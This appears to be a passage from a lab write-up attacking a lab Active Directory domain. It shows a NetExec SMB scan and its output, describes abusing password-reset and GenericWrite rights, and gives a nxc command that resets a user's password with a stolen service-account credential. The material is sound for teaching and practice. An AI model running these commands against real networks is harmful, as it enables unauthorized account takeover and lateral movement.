SMB         10.0.0.6        445    WS-IT            [*] Windows 11 / Server 2025 Build 26100 x64 (name:WS-IT) (domain:orion.local) (signing:True) (SMBv1:None)
┌──(kali㉿kali)-[~/Desktop/Labs/Orion]
└─$ nxc smb 10.0.0.0/24
SMB         10.0.0.5        445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:orion.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.0.6        445    WS-IT            [*] Windows 11 / Server 2025 Build 26100 x64 (name:WS-IT) (domain:orion.local) (signing:True) (SMBv1:None)

From the output above, the DC is the host ending in 5, and the host station is ending in 6. Both belong to the domain orion.local.

Checking the domain data shows this user has the privilege to change the password of three users:

These users are j.carter, s.mitchell, and d.brooks.

The interesting user is s.mitchell as it has GenericWrite over m.white and d.miller as it belongs to the HELPDESKOPS-TIER2 group:

And the user m.white belongs to the WS-IT-REMOTEACCESS group:

Maybe this access allows m.white to access the workstation. Now the goal is to access this workstation.

Firstly, I changed the password of the user s.mitchell to Pwned123 using NetExec:

┌──(kali㉿kali)-[~/Desktop/Labs/Orion]
└─$ nxc smb orion.local -u svc-onboarding -p password2510 -M change-password -o USER=s.mitchell NEWPASS=Pwned123
